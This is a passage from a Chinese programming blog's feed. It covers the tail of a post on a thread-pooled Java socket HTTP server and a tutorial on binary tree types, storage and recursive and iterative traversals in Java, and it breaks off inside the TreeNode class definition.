<span class="title function_">startHttpServer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 获取处理器可用核心数，用于设置线程池大小</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">nThreads</span> <span class="operator">=</span> Runtime.getRuntime().availableProcessors();</span><br><span class="line">        <span class="comment">// 初始化线程池，设置线程池大小，队列大小和丢弃策略</span></span><br><span class="line">        taskExecutor =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(nThreads, nThreads, <span class="number">0L</span>, TimeUnit.MILLISECONDS, <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="number">100</span>),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.DiscardPolicy());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 循环尝试启动服务器，如果启动失败，则等待10秒后重试</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(PORT);</span><br><span class="line">                bootstrapExecutor.submit(<span class="keyword">new</span> <span class="title class_">ServerThread</span>(serverSocket));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 重试，等待 10 秒</span></span><br><span class="line">                    TimeUnit.SECONDS.sleep(<span class="number">10</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">                    Thread.currentThread().interrupt();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭启动执行器</span></span><br><span class="line">        bootstrapExecutor.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// HTTP 服务器主要任务类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ServerThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="comment">// 保存传递给构造函数的 ServerSocket 实例</span></span><br><span class="line">        <span class="keyword">private</span> ServerSocket serverSocket;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ServerThread</span><span class="params">(ServerSocket s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="built_in">this</span>.serverSocket = s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 任务主体方法</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 等待客户端连接</span></span><br><span class="line">                    <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="built_in">this</span>.serverSocket.accept();</span><br><span class="line">                    <span class="comment">// 创建一个 HttpTask 实例，将 Socket 实例作为参数传递</span></span><br><span class="line">                    <span class="type">HttpTask</span> <span class="variable">eventTask</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpTask</span>(socket);</span><br><span class="line">                    <span class="comment">// 将 HttpTask 提交给 taskExecutor 执行</span></span><br><span class="line">                    taskExecutor.submit(eventTask);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 如果发生异常，等待 1 秒后继续尝试</span></span><br><span class="line">                        TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">                        Thread.currentThread().interrupt();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是一个简单的 HTTP 服务器实现。以下是关于这个 HTTP 服务器的主要组件和功能的详细解释：<br>1、bootstrapExecutor：一个单线程的 ExecutorService，用于执行 HTTP 服务器的启动任务。<br>2、taskExecutor：一个线程池，用于处理来自客户端的 HTTP 请求。线程池的大小等于处理器可用核心数，队列大小为100，使用 DiscardPolicy 丢弃策略。<br>3、PORT：服务器侦听的端口号，默认为 8999。<br>4、startHttpServer() 方法：<br>    - a.创建一个线程池 taskExecutor 用于处理 HTTP 请求。<br>    - b.在一个循环中，尝试创建一个 ServerSocket 实例并绑定到指定端口。如果失败，则等待 10 秒后重试。<br>    - c.当成功创建 ServerSocket 实例后，将其作为参数提交给 bootstrapExecutor 执行 ServerThread 任务。<br>    - d.关闭 bootstrapExecutor。<br>5、ServerThread 类实现了 Runnable 接口，它是 HTTP 服务器的主要任务：<br>    - a.serverSocket 成员变量：保存传递给构造函数的 ServerSocket 实例。<br>    - b.run() 方法：<br>        - 在一个无限循环中，调用 serverSocket.accept() 方法等待客户端的连接。<br>        - 当接受到一个新的客户端连接时，创建一个 HttpTask 实例，将 Socket 实例作为参数传递。<br>        - 将 HttpTask 提交给 taskExecutor 执行。</p><p>这个 HTTP 服务器的主要逻辑是：使用一个线程来监听客户端连接，当有新的客户端连接时，创建一个 HttpTask 来处理客户端的 HTTP 请求，并将这个任务提交给线程池 taskExecutor 执行。这样可以实现多个客户端请求的并发处理。<br>到这里，一个基于 Socket 实现的 HTTP 服务器基本上就搭建完了，接下来就可以进行测试了</p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】二叉树</title>
      <link href="/2024/10/29/algorithm/binarytree/"/>
      <url>/2024/10/29/algorithm/binarytree/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树理论基础篇"><a href="#二叉树理论基础篇" class="headerlink" title="二叉树理论基础篇"></a>二叉树理论基础篇</h2><p><img src="/2024/10/29/algorithm/binarytree/image.png"></p><h3 id="二叉树的种类"><a href="#二叉树的种类" class="headerlink" title="二叉树的种类"></a>二叉树的种类</h3><p>满二叉树：如果一棵二叉树只有度为0的结点和度为2的结点，并且度为0的结点在同一层上，则这棵二叉树为满二叉树。也可以说深度为k，有2^k-1个节点的二叉树。<br><img src="/2024/10/29/algorithm/binarytree/image-1.png"><br>完全二叉树：在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。若最底层为第 h 层（h从1开始），则该层包含 1~ 2^(h-1) 个节点。<br><img src="/2024/10/29/algorithm/binarytree/image-2.png"><br>二叉搜索树：前面介绍的树，都没有数值的，而二叉搜索树是有数值的了，二叉搜索树是一个有序树。若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；<br><img src="/2024/10/29/algorithm/binarytree/image-3.png"><br>平衡二叉搜索树：又被称为AVL（Adelson-Velsky and Landis）树，且具有以下性质：它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树。C++中map、set、multimap，multiset的底层实现都是平衡二叉搜索树，所以map、set的增删操作时间时间复杂度是logn，注意我这里没有说unordered_map、unordered_set，unordered_map、unordered_set底层实现是哈希表。<br><img src="/2024/10/29/algorithm/binarytree/image-4.png"></p><h3 id="二叉树的存储方式"><a href="#二叉树的存储方式" class="headerlink" title="二叉树的存储方式"></a>二叉树的存储方式</h3><p>二叉树可以链式存储，也可以顺序存储。<br>那么链式存储方式就用指针， 顺序存储的方式就是用数组。<br>顾名思义就是顺序存储的元素在内存是连续分布的，而链式存储则是通过指针把分布在各个地址的节点串联一起。<br><img src="/2024/10/29/algorithm/binarytree/image-5.png"><br>顺序存储<br><img src="/2024/10/29/algorithm/binarytree/image-6.png"><br>用数组来存储二叉树如何遍历的呢？如果父节点的数组下标是 i，那么它的左孩子就是 i * 2 + 1，右孩子就是 i * 2 + 2。但是用链式表示的二叉树，更有利于我们理解，所以一般我们都是用链式存储二叉树。</p><h3 id="二叉树的遍历方式"><a href="#二叉树的遍历方式" class="headerlink" title="二叉树的遍历方式"></a>二叉树的遍历方式</h3><p>二叉树主要有两种遍历方式：</p><ol><li>深度优先遍历：先往深走，遇到叶子节点再往回走。<ul><li>前序遍历（递归法，迭代法）</li><li>中序遍历（递归法，迭代法）</li><li>后序遍历（递归法，迭代法）<br><img src="/2024/10/29/algorithm/binarytree/image-7.png"></li></ul></li><li>广度优先遍历：一层一层的去遍历。<ul><li>层次遍历（迭代法）<br>这两种遍历是图论中最基本的两种遍历方式，后面在介绍图论的时候 还会介绍到。<br>我们做二叉树相关题目，经常会使用递归的方式来实现深度优先遍历，也就是实现前中后序遍历，使用递归是比较方便的。<br>之前我们讲栈与队列的时候，就说过栈其实就是递归的一种实现结构，也就说前中后序遍历的逻辑其实都是可以借助栈使用递归的方式来实现的。<br>而广度优先遍历的实现一般使用队列来实现，这也是队列先进先出的特点所决定的，因为需要先进先出的结构，才能一层一层的来遍历二叉树。</li></ul></li></ol><p>二叉树的递归遍历：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前序遍历·递归·LC144_二叉树的前序遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        preorder(root, result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; result)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(root.val);</span><br><span class="line">        preorder(root.left, result);</span><br><span class="line">        preorder(root.right, result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 中序遍历·递归·LC94_二叉树的中序遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        inorder(root, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">inorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inorder(root.left, list);</span><br><span class="line">        list.add(root.val);             <span class="comment">// 注意这一句</span></span><br><span class="line">        inorder(root.right, list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 后序遍历·递归·LC145_二叉树的后序遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        postorder(root, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">postorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        postorder(root.left, list);</span><br><span class="line">        postorder(root.right, list);</span><br><span class="line">        list.add(root.val);             <span class="comment">// 注意这一句</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二叉树的迭代遍历：我们在栈与队列：匹配问题都是栈的强项 (opens new window)中提到了，递归的实现就是：每一次递归调用都会把函数的局部变量、参数值和返回地址等压入调用栈中，然后递归返回的时候，从栈顶弹出上一次递归的各项参数，所以这就是递归为什么可以返回上一层位置的原因。<br>前序遍历（迭代法）:前序遍历是中左右，每次先处理的是中间节点，那么先将根节点放入栈中，然后将右孩子加入栈，再加入左孩子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            result.add(node.val);</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历顺序: 左-中-右 入栈顺序： 左-右</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">null</span> || !stack.isEmpty())&#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span>)&#123;</span><br><span class="line">               stack.push(cur);</span><br><span class="line">               cur = cur.left;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               cur = stack.pop();</span><br><span class="line">               result.add(cur.val);</span><br><span class="line">               cur = cur.right;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历顺序 左-右-中 入栈顺序：中-左-右 出栈顺序：中-右-左， 最后翻转结果</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            result.add(node.val);</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Collections.reverse(result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二叉树的统一迭代法:我们以中序遍历为例，无法同时解决访问节点（遍历节点）和处理节点（将元素放进结果集）不一致的情况。那我们就将访问的节点放入栈中，把要处理的节点也放入栈中但是要做标记。如何标记呢，就是要处理的节点放入栈之后，紧接着放入一个空指针作为标记。 这种方法也可以叫做标记法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 迭代法前序遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">null</span>) st.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.empty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> st.peek();</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">                st.pop(); <span class="comment">// 将该节点弹出，避免重复操作，下面再将右中左节点添加到栈中</span></span><br><span class="line">                <span class="keyword">if</span> (node.right!=<span class="literal">null</span>) st.push(node.right);  <span class="comment">// 添加右节点（空节点不入栈）</span></span><br><span class="line">                <span class="keyword">if</span> (node.left!=<span class="literal">null</span>) st.push(node.left);    <span class="comment">// 添加左节点（空节点不入栈）</span></span><br><span class="line">                st.push(node);                          <span class="comment">// 添加中节点</span></span><br><span class="line">                st.push(<span class="literal">null</span>); <span class="comment">// 中节点访问过，但是还没有处理，加入空节点做为标记。</span></span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 只有遇到空节点的时候，才将下一个节点放进结果集</span></span><br><span class="line">                st.pop();           <span class="comment">// 将空节点弹出</span></span><br><span class="line">                node = st.peek();    <span class="comment">// 重新取出栈中元素</span></span><br><span class="line">                st.pop();</span><br><span class="line">                result.add(node.val); <span class="comment">// 加入到结果集</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代法中序遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root != <span class="literal">null</span>) st.push(root);</span><br><span class="line">    <span class="keyword">while</span> (!st.empty()) &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> st.peek();</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">            st.pop(); <span class="comment">// 将该节点弹出，避免重复操作，下面再将右中左节点添加到栈中</span></span><br><span class="line">            <span class="keyword">if</span> (node.right!=<span class="literal">null</span>) st.push(node.right);  <span class="comment">// 添加右节点（空节点不入栈）</span></span><br><span class="line">            st.push(node);                          <span class="comment">// 添加中节点</span></span><br><span class="line">            st.push(<span class="literal">null</span>); <span class="comment">// 中节点访问过，但是还没有处理，加入空节点做为标记。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (node.left!=<span class="literal">null</span>) st.push(node.left);    <span class="comment">// 添加左节点（空节点不入栈）</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 只有遇到空节点的时候，才将下一个节点放进结果集</span></span><br><span class="line">            st.pop();           <span class="comment">// 将空节点弹出</span></span><br><span class="line">            node = st.peek();    <span class="comment">// 重新取出栈中元素</span></span><br><span class="line">            st.pop();</span><br><span class="line">            result.add(node.val); <span class="comment">// 加入到结果集</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代法后序遍历代码</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">null</span>) st.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.empty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> st.peek();</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">                st.pop(); <span class="comment">// 将该节点弹出，避免重复操作，下面再将右中左节点添加到栈中</span></span><br><span class="line">                st.push(node);                          <span class="comment">// 添加中节点</span></span><br><span class="line">                st.push(<span class="literal">null</span>); <span class="comment">// 中节点访问过，但是还没有处理，加入空节点做为标记。</span></span><br><span class="line">                <span class="keyword">if</span> (node.right!=<span class="literal">null</span>) st.push(node.right);  <span class="comment">// 添加右节点（空节点不入栈）</span></span><br><span class="line">                <span class="keyword">if</span> (node.left!=<span class="literal">null</span>) st.push(node.left);    <span class="comment">// 添加左节点（空节点不入栈）         </span></span><br><span class="line">                               </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 只有遇到空节点的时候，才将下一个节点放进结果集</span></span><br><span class="line">                st.pop();           <span class="comment">// 将空节点弹出</span></span><br><span class="line">                node = st.peek();    <span class="comment">// 重新取出栈中元素</span></span><br><span class="line">                st.pop();</span><br><span class="line">                result.add(node.val); <span class="comment">// 加入到结果集</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的结构"><a href="#二叉树的结构" class="headerlink" title="二叉树的结构"></a>二叉树的结构</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TreeNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line"></span><br><span class="line">    TreeNode() &#123;&#125;</span><br><span class="line">    TreeNode(<span class="type">int</span> val) &#123; <span class="built_in">this</span>.val = val; &#125;</span><br><span class="line">    TreeNode(<span class="type">int</span> val, TreeNode left, TreeNode right) &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">        <span 